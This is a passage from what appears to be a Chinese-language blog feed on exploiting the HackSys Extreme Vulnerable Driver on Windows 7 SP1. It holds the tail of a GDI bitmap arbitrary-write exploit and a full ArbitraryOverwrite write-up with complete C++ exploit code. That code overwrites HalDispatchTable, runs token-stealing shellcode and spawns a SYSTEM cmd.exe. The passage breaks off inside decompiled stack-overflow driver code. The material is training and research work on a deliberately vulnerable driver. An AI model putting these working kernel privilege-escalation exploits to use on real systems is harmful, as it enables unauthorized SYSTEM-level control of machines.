class="built_in">printf</span>(<span class="string">"    GdiSharedHandleTableAddr: 0x%p\n"</span>, GdiSharedHandleTableAddr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// GdiSharedHandleTableAddr 是一个指向GDICELL结构体数组的指针</span></span><br><span class="line">	<span class="comment">// GDICELL 结构体 x86 0x10,x64 0x18</span></span><br><span class="line">	DWORD32 pKernelAddress = GdiSharedHandleTableAddr + ((DWORD32)handle &amp; <span class="number">0xffff</span>) * <span class="number">0x10</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    pKernelAddress: 0x%p\n"</span>, pKernelAddress);</span><br><span class="line"></span><br><span class="line">	DWORD32 surfaceObject = *(PDWORD32)pKernelAddress;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    surfaceObject address: 0x%p\n"</span>, surfaceObject);</span><br><span class="line">	<span class="comment">// BASEOBJECT 结构体 x86 0x10,x64 0x18</span></span><br><span class="line">	<span class="comment">// pvScan0 在 SURFOBJ 结构体中的偏移 x86 0x20,x64 0x38</span></span><br><span class="line">	DWORD32 pvScan0Address = surfaceObject + <span class="number">0x10</span> + <span class="number">0x20</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"    pvScan0 address: 0x%p\n"</span>, pvScan0Address);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> pvScan0Address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">Trigger</span><span class="params">(DWORD32 where, DWORD32 what, HANDLE hevd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WRITE_WHAT_WHERE exploit;</span><br><span class="line">	DWORD lpbReturn = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	exploit.Where = (PULONG_PTR)where;</span><br><span class="line">	exploit.What = (PULONG_PTR)&amp; what;</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hevd,</span><br><span class="line">		<span class="number">0x22200B</span>,</span><br><span class="line">		&amp;exploit,</span><br><span class="line">		<span class="keyword">sizeof</span>(WRITE_WHAT_WHERE),</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;lpbReturn,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">OpenDriver</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE hevd = CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hevd == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		wprintf(<span class="string">L"[-] Failed to open hevd\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		wprintf(<span class="string">L"[+] Success to open hevd\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> hevd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE hevd = OpenDriver();</span><br><span class="line">	HBITMAP hManager = CreateBitmap(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hManager == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"create manager bitmap failed\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	HBITMAP hWorker = CreateBitmap(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hWorker == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"create worker bitmap failed\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Manager bitmap:\n"</span>);</span><br><span class="line">	DWORD32 ManagerpvScan0Address = getpvScan0Address(hManager);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Worker bitmap:\n"</span>);</span><br><span class="line">	DWORD32 WorkerpvScan0Address = getpvScan0Address(hWorker);</span><br><span class="line">	Trigger(ManagerpvScan0Address, WorkerpvScan0Address, hevd);</span><br><span class="line"></span><br><span class="line">	DWORD32 systemEprocessAddr = <span class="number">0</span>;</span><br><span class="line">	systemEprocessAddr = getSystemEProcessAddr();</span><br><span class="line">	LPVOID lpSystemToken = <span class="literal">NULL</span>; <span class="comment">// 获取 system 进程的 token</span></span><br><span class="line">	readOOB(hManager, hWorker, getSystemEProcessAddr(), &amp;systemEprocessAddr, <span class="keyword">sizeof</span>(DWORD32));</span><br><span class="line">	readOOB(hManager, hWorker, (systemEprocessAddr + <span class="number">0x0f4</span>), &amp;lpSystemToken, <span class="keyword">sizeof</span>(DWORD32));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// _eprocess + 0x0f4 是 token</span></span><br><span class="line">	<span class="comment">// _eprocess + 0x0B8 是 ActiveProcessLinks.Flink</span></span><br><span class="line">	<span class="comment">// _eprocess + 0x0b4 是 processid</span></span><br><span class="line">	<span class="comment">// 获取当前进程的 _eprocess</span></span><br><span class="line">	DWORD32 lpNextEPROCESS = <span class="number">0</span>;</span><br><span class="line">	LPVOID lpCurrentPID = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD32 dwCurrentPID;</span><br><span class="line">	LIST_ENTRY lpNextEntryAddreess = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	DWORD32 currentProcessID = GetCurrentProcessId();   <span class="comment">// 通过PID判断是否获取到当前进程的地址</span></span><br><span class="line">	readOOB(hManager, hWorker, systemEprocessAddr + <span class="number">0x0B8</span>, &amp;lpNextEntryAddreess, <span class="keyword">sizeof</span>(LIST_ENTRY));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span>  <span class="comment">// 根据PID是否找到当前进程 </span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 获取下一个进程</span></span><br><span class="line">		lpNextEPROCESS = (DWORD32)((PUCHAR)lpNextEntryAddreess.Flink - <span class="number">0x0B8</span>);</span><br><span class="line">		<span class="comment">// 获取PID</span></span><br><span class="line">		readOOB(hManager, hWorker, lpNextEPROCESS + <span class="number">0x0b4</span>, &amp;lpCurrentPID, <span class="keyword">sizeof</span>(LPVOID));</span><br><span class="line">		dwCurrentPID = LOWORD(lpCurrentPID);</span><br><span class="line">		readOOB(hManager, hWorker, lpNextEPROCESS + <span class="number">0x0B8</span>, &amp;lpNextEntryAddreess, <span class="keyword">sizeof</span>(LIST_ENTRY));</span><br><span class="line">	&#125; <span class="keyword">while</span> (dwCurrentPID != currentProcessID);</span><br><span class="line"></span><br><span class="line">	DWORD32 currentTokenAddress = (DWORD32)lpNextEPROCESS + <span class="number">0x0f4</span>;</span><br><span class="line">	writeOOB(hManager, hWorker, currentTokenAddress, lpSystemToken, <span class="keyword">sizeof</span>(LPVOID));</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="pcan-kao">参考</span><a href="#pcan-kao" class="header-anchor">#</a></h2><ul><li><a href="https://50u1w4y.github.io/site/HEVD/bitmap">bitmap 任意地址写漏洞利用</a></li><li><a href="https://paper.seebug.org/876/">Windows Kernel Exploit Part 5</a></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>HEVD</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>HEVD</tag>
      </tags>
  </entry>
  <entry>
    <title>HEVD ArbitraryOverwrite [win7sp1]</title>
    <url>/bbe71603.html</url>
    <content><![CDATA[<blockquote><p>HEVD 系列第二类漏洞ArbitraryOverwrite</p></blockquote><a id="more"></a><h2><span id="plou-dong-fen-xi">漏洞分析</span><a href="#plou-dong-fen-xi" class="header-anchor">#</a></h2><h3><span id="plou-dong-dian">漏洞点</span><a href="#plou-dong-dian" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-30-03-upload_3401bba28f9d994774192ca3c887e6f7.png" alt="img"><br>可以看到，如果是安全状态下，ProbeForRead/ProbeForWrite会检查地址指向的空间是否为用户空间，而漏洞并没有检查，因此出现了任意地址写任意值的漏洞</p><h3><span id="phong-fa-lu-jing">触发路径</span><a href="#phong-fa-lu-jing" class="header-anchor">#</a></h3><p>同前，可以看到当传入参数为0x22200b时，会触发该漏洞</p><h2><span id="pli-yong-fang-fa">利用方法</span><a href="#pli-yong-fang-fa" class="header-anchor">#</a></h2><p>任意地址写任意值，因此也就是要回答两个问题，1.什么地址；2.写什么值，第二个问题很好回答，显然是写用户态的shellcode地址，因此我们要回答一下第一个问题。答案是HalDispatchTable的第二个表项的地址<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-30-03-upload_8490cc299e76d877a257555b3beeb0fd.png" alt="img"><br>它是一个存在于内核态的系统调用表，当我们获得任意地址写的能力后，可以使用shellcode地址覆盖偏移为4的函数HalQuerySystemInformation，然后调用NtQueryIntervalProfile函数，即可通过该表调用shellcode，之所以选择覆盖这个函数，是因为它基本没有什么用，覆盖后应该不会使内核崩溃</p><p>当漏洞可以获得任意地址写任意值的能力时，可以利用HalDispatchTable进行利用</p><p>利用过程：</p><ol><li>找ntkrnlpa.exe内核态地址：使用EnumDeviceDrivers函数枚举所有的设备驱动地址，找到名为ntkrnlpa.exe驱动的内核态地址</li><li>找ntkrnlpa.exe用户态地址：使用LoadLibraryA函数加载ntkrnlpa.exe到内存获得用户态地址，</li><li>找到HalDispatchTable地址：然后使用GetProcAddress函数获得HalDispatchTable的用户态地址</li><li>根据偏移可以计算出HalDispatchTable的内核地址</li><li>覆盖HalQuerySystemInformation地址为shellcode地址，通过shellcode替换windows token提权</li><li>调用NtQueryIntervalProfile触发shellcode</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; u nt!NtQueryIntervalProfile+0x70</span><br><span class="line">nt!NtQueryIntervalProfile+0x70:</span><br><span class="line">84149edb 84db            test    bl,bl</span><br><span class="line">84149edd 741b            je      nt!NtQueryIntervalProfile+0x8f (84149efa)</span><br><span class="line">84149edf c745fc01000000  mov     dword ptr [ebp-4],1</span><br><span class="line">84149ee6 8906            mov     dword ptr [esi],eax</span><br><span class="line">84149ee8 eb07            jmp     nt!NtQueryIntervalProfile+0x86 (84149ef1)</span><br><span class="line">84149eea 33c0            xor     eax,eax</span><br><span class="line">84149eec 40              inc     eax</span><br><span class="line">84149eed c3              ret</span><br><span class="line">kd&gt; u nt!KeQueryIntervalProfile+0x23</span><br><span class="line">nt!KeQueryIntervalProfile+0x23:</span><br><span class="line">84108438 ff15fc83f683    call    dword ptr [nt!HalDispatchTable+0x4 (83f683fc)]</span><br><span class="line">8410843e 85c0            test    eax,eax</span><br><span class="line">84108440 7c0b            jl      nt!KeQueryIntervalProfile+0x38 (8410844d)</span><br><span class="line">84108442 807df400        cmp     byte ptr [ebp-0Ch],0</span><br><span class="line">84108446 7405            je      nt!KeQueryIntervalProfile+0x38 (8410844d)</span><br><span class="line">84108448 8b45f8          mov     eax,dword ptr [ebp-8]</span><br><span class="line">8410844b c9              leave</span><br><span class="line">8410844c c3              ret</span><br></pre></td></tr></table></figure><h2><span id="pc-exp-vs2017">C++ exp(VS2017)</span><a href="#pc-exp-vs2017" class="header-anchor">#</a></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	PULONG_PTR What;</span><br><span class="line">	PULONG_PTR Where;</span><br><span class="line">&#125; WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* NtQueryIntervalProfile_t)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	IN ULONG ProfileSource,</span></span></span><br><span class="line"><span class="function"><span class="params">	OUT PULONG Interval</span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LPVOID <span class="title">GetntkrnlpaKernelBase</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//Retrieves the load address for each device driver in the system</span></span><br><span class="line">	LPVOID lpImageBase[<span class="number">1024</span>];</span><br><span class="line">	DWORD lpcbNeeded;</span><br><span class="line">	TCHAR lpfileName[<span class="number">1024</span>];</span><br><span class="line">	EnumDeviceDrivers(lpImageBase, <span class="keyword">sizeof</span>(lpImageBase), &amp;lpcbNeeded);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//Retrieves the base name of the specified device driver</span></span><br><span class="line">		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, <span class="number">48</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">char</span> *)lpfileName, <span class="string">"ntkrnlpa.exe"</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[+] Success to get %s\n"</span>, (<span class="keyword">char</span> *)lpfileName);</span><br><span class="line">			<span class="keyword">return</span> lpImageBase[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">PVOID <span class="title">GetHalDispatchTable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 找到 ntkrnlpa.exe 在 kernel mode 中的基地址</span></span><br><span class="line">	LPVOID ntkrnlpaKernelBase = GetntkrnlpaKernelBase();</span><br><span class="line">	<span class="keyword">if</span> (!ntkrnlpaKernelBase) &#123;</span><br><span class="line">		wprintf(<span class="string">L"[-] Failed to get ntkrnlpaKernelBase\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		wprintf(<span class="string">L"[+] Success to get ntkrnlpaKernelBase: 0x%p\n"</span>,ntkrnlpaKernelBase);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 找到 ntkrnlpa.exe 在 user mode 中的基地址</span></span><br><span class="line">	HMODULE ntkrnlpaUserBase = <span class="literal">NULL</span>;</span><br><span class="line">	ntkrnlpaUserBase = LoadLibraryA(<span class="string">"ntkrnlpa.exe"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ntkrnlpaUserBase) &#123;</span><br><span class="line">		wprintf(<span class="string">L"[-] Failed to get ntkrnlpaUserBase\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		wprintf(<span class="string">L"[+] Success to get ntkrnlpaUserBase: 0x%p\n"</span>, ntkrnlpaUserBase);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 找到 HalDispatchTable 在 user mode 中的地址</span></span><br><span class="line">	PVOID halDispatchTableUserAddress = <span class="literal">NULL</span>;</span><br><span class="line">	halDispatchTableUserAddress = GetProcAddress(ntkrnlpaUserBase, <span class="string">"HalDispatchTable"</span>);</span><br><span class="line">	<span class="keyword">if</span> (!halDispatchTableUserAddress) &#123;</span><br><span class="line">		wprintf(<span class="string">L"[-] Failed to get halDispatchTableUserAddress\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		wprintf(<span class="string">L"[+] Success to get halDispatchTableUserAddress: 0x%p\n"</span>, halDispatchTableUserAddress);</span><br><span class="line">		PVOID halDispatchTable = (PVOID)((ULONG_PTR)ntkrnlpaKernelBase + ((ULONG_PTR)halDispatchTableUserAddress - (ULONG_PTR)ntkrnlpaUserBase));</span><br><span class="line">		<span class="keyword">return</span> halDispatchTable;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">OpenDriver</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE hevd = CreateFileA(<span class="string">"\\\\.\\HackSysExtremeVulnerableDriver"</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hevd == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		wprintf(<span class="string">L"[-] Failed to open hevd\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		wprintf(<span class="string">L"[+] Success to open hevd\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> hevd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">ShellCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3</span></span><br><span class="line">		pop edi	<span class="comment">// the stack balancing</span></span><br><span class="line">		pop esi</span><br><span class="line">		pop ebx</span><br><span class="line">		pushad</span><br><span class="line">		mov eax, fs: [<span class="number">124</span>h]		<span class="comment">// Find the _KTHREAD structure for the current thread</span></span><br><span class="line">		mov eax, [eax + <span class="number">0x50</span>]   <span class="comment">// Find the _EPROCESS structure</span></span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span>				<span class="comment">// edx = system PID(4)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// The loop is to get the _EPROCESS of the system</span></span><br><span class="line">		find_sys_pid :</span><br><span class="line">					 mov eax, [eax + <span class="number">0xb8</span>]	<span class="comment">// Find the process activity list</span></span><br><span class="line">					 sub eax, <span class="number">0xb8</span>    		<span class="comment">// List traversal</span></span><br><span class="line">					 cmp[eax + <span class="number">0xb4</span>], edx    <span class="comment">// Determine whether it is SYSTEM based on PID</span></span><br><span class="line">					 jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">					 <span class="comment">// Replace the Token</span></span><br><span class="line">					 mov edx, [eax + <span class="number">0xf8</span>]</span><br><span class="line">					 mov[ecx + <span class="number">0xf8</span>], edx</span><br><span class="line">					 popad</span><br><span class="line">					 <span class="comment">//int 3</span></span><br><span class="line">					 ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="function">VOID <span class="title">Trigger</span><span class="params">(DWORD32 where, DWORD32 what, HANDLE hevd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WRITE_WHAT_WHERE exploit;</span><br><span class="line">	DWORD lpbReturn = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	exploit.Where = (PULONG_PTR)where;</span><br><span class="line">	exploit.What = (PULONG_PTR)&amp; what;</span><br><span class="line"></span><br><span class="line">	DeviceIoControl(hevd,</span><br><span class="line">		<span class="number">0x22200B</span>,</span><br><span class="line">		&amp;exploit,</span><br><span class="line">		<span class="keyword">sizeof</span>(WRITE_WHAT_WHERE),</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		&amp;lpbReturn,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE hevd = OpenDriver();</span><br><span class="line"></span><br><span class="line">	PVOID HalDispatchTable = <span class="literal">NULL</span>;</span><br><span class="line">	HalDispatchTable = GetHalDispatchTable();</span><br><span class="line">	<span class="keyword">if</span> (!HalDispatchTable) &#123;</span><br><span class="line">		wprintf(<span class="string">L"[-] Failed to get HalDispatchTable\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		wprintf(<span class="string">L"[+] Success to get HalDispatchTable:0x%p\n"</span>,HalDispatchTable);</span><br><span class="line">	&#125;</span><br><span class="line">	PVOID HalDispatchTablePlus4 = <span class="literal">NULL</span>;</span><br><span class="line">	HalDispatchTablePlus4 = (PVOID)((ULONG_PTR)HalDispatchTable + <span class="keyword">sizeof</span>(PVOID));</span><br><span class="line">	wprintf(<span class="string">L"[+] Success to get HalDispatchTable+4:0x%p\n"</span>,HalDispatchTablePlus4);</span><br><span class="line"></span><br><span class="line">	Trigger((DWORD32)HalDispatchTablePlus4,(DWORD32)&amp; ShellCode,hevd);</span><br><span class="line">	</span><br><span class="line">	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA(<span class="string">"ntdll.dll"</span>), <span class="string">"NtQueryIntervalProfile"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]NtQueryIntervalProfile address is 0x%x\n"</span>, NtQueryIntervalProfile);</span><br><span class="line">	ULONG interVal;</span><br><span class="line">	NtQueryIntervalProfile(<span class="number">0x1337</span>, &amp;interVal);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[+]Start to Create cmd...\n"</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h2><ul><li><a href="https://bbs.pediy.com/thread-253848.htm">HEVD内核漏洞之任意地址覆盖</a></li><li><a href="https://50u1w4y.github.io/site/HEVD/arbitraryWrite/">HEVD 任意地址覆盖</a></li><li><a href="https://bbs.pediy.com/thread-252506.htm">Windows Kernel Exploit 内核漏洞学习(3)-任意内存覆盖漏洞</a></li><li><a href="https://rootkits.xyz/blog/2017/09/kernel-write-what-where/">Windows Kernel Exploitation Tutorial Part 3: Arbitrary Memory Overwrite (Write-What-Where)</a></li></ul>]]></content>
      <categories>
        <category>research</category>
        <category>HEVD</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>HEVD</tag>
      </tags>
  </entry>
  <entry>
    <title>HEVD StackOverFlow [win7sp1]</title>
    <url>/c09ea323.html</url>
    <content><![CDATA[<blockquote><p>HEVD 系列第一类漏洞StackOverFlow</p></blockquote><a id="more"></a><h2><span id="plou-dong-fen-xi">漏洞分析</span><a href="#plou-dong-fen-xi" class="header-anchor">#</a></h2><h3><span id="plou-dong-dian">漏洞点</span><a href="#plou-dong-dian" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-26-03-upload_c8a4117e3911579ecc8cdefb4b4f741f.png" alt="img"><br>可以看到漏洞原因在于从UserBuffer拷贝到KernelBuffer时，由于size使用了UserBuffer的大小，因此造成了栈溢出漏洞</p><h3><span id="phong-fa-lu-jing">触发路径</span><a href="#phong-fa-lu-jing" class="header-anchor">#</a></h3><p>IDA逆向后可以看到触发路径为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">IrpDeviceIoCtlHandler</span><span class="params">(_DEVICE_OBJECT *DeviceObject, _IRP *Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  _IO_STACK_LOCATION *v3; <span class="comment">// eax</span></span><br><span class="line">  _IO_STACK_LOCATION *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">void</span> (*v5)(ULONG, ULONG, PCSTR, ...); <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// [esp-4h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">-1073741637</span>;</span><br><span class="line">  v3 = Irp-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = Irp-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">    <span class="keyword">switch</span> ( v3-&gt;Parameters.Read.ByteOffset.LowPart )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x222003</span>u:</span><br><span class="line">        v5 = (<span class="keyword">void</span> (*)(ULONG, ULONG, PCSTR, ...))_DbgPrintEx;</span><br><span class="line">        _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">"****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n"</span>);</span><br><span class="line">        v6 = BufferOverflowStackIoctlHandler(Irp, v4);</span><br><span class="line">        v8 = <span class="string">"****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n"</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        ....</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">BufferOverflowStackIoctlHandler</span><span class="params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  _NAMED_PIPE_CREATE_PARAMETERS *v3; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">-1073741823</span>;</span><br><span class="line">  v3 = IrpSp-&gt;Parameters.CreatePipe.Parameters;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    v2 = TriggerBufferOverflowStack(v3, IrpSp-&gt;Parameters.Create.Options);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">TriggerBufferOverflowStack</span><span class="params">(<span class="keyword">void</span> *UserBuffer, <span class="keyword">unsigned</span> <span class="keyword">int</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> KernelBuffer[<span class="number">512</span>]; <span class="comment">// [esp+10h] [ebp-81Ch]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+814h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(KernelBuffer, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  ProbeForRead(UserBuffer, <span class="number">0x800</span>u, <span class="number">1u</span>);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">"[+] UserBuffer: 0x%p\n"</span>, UserBuffer);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">"[+] UserBuffer Size: 0x%X\n"</span>, Size);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">"[+] KernelBuffer: 0x%p\n"</span>, KernelBuffer);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">"[+] KernelBuffer Size: 0x%X\n"</span>, <span 